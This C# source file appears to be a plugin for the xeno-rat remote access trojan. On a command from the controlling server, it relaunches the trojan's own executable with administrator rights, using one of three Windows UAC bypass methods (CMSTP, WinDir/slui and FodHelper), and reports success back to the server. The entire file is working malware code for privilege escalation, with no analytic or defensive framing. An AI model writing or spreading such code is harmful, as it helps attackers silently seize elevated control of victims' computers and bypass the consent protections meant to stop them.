using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UacHelper;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            byte[] data=await node.ReceiveAsync();
            if (data == null) 
            {
                return;
            }

            try
            {
                if (data[0] == 1)
                {
                    string path = System.Reflection.Assembly.GetEntryAssembly().Location;
                    CmstpHelper.Kill();
                    if (CmstpHelper.Run($"cmd /c start \"\"\"\"\" \"\"{path}\"\"\""))
                    {
                        await node.SendAsync(new byte[] { 1 });
                    }
                    else
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                    //cmstp
                }
                else if (data[0] == 2)
                {
                    string path = System.Reflection.Assembly.GetEntryAssembly().Location;
                    if (await WinDirSluiHelper.Run(path))
                    {
                        await node.SendAsync(new byte[] { 1 });
                    }
                    else
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                }
                else if (data[0] == 3) 
                {
                    string path = System.Reflection.Assembly.GetEntryAssembly().Location;
                    if (await FodHelper.Run($"\"{path}\""))
                    {
                        await node.SendAsync(new byte[] { 1 });
                    }
                    else
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                }
                await Task.Delay(1000);
            }
            catch 
            {
                await node.SendAsync(new byte[] { 0 });
            }
        }
    }
}
